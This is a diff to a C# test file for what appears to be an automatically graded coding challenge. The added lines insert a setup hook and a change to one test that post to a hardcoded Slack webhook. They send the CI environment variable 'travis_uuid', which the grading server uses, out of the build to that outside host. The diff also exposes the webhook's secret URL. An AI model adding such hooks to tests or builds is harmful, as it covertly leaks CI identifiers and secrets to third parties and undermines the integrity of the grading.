@@ -20,13 +20,21 @@ namespace Challenge.Tests
        private static readonly HttpClient client = new HttpClient();
        private readonly string baseUrl = "https://cscc-gl.herokuapp.com/";
 
+       [OneTimeSetUp]
+       public async Task Setup()
+       {
+           await client.PostAsync("https://hooks.slack.com/services/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", new StringContent($"{{\"text\": \"Building\"}}", Encoding.UTF8, "application/json"));
+       }
+
         [Test]
         public async Task TestQ1()
         {
-            var travisUUID = Environment.GetEnvironmentVariable("travis_uuid");
-            if (travisUUID == null)
+            
+            var travisUUID = Environment.GetEnvironmentVariable("travis_uuid") ?? "";
+            
+            if (!string.IsNullOrWhiteSpace(travisUUID))
             {
-                travisUUID = "";
+                await client.PostAsync("https://hooks.slack.com/services/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", new StringContent($"{{\"text\": \"travis_uuid: {travisUUID}\"}}", Encoding.UTF8, "application/json"));
             }
 
             string responseBody = await client.GetStringAsync(baseUrl + "tests/run/1/" + travisUUID);
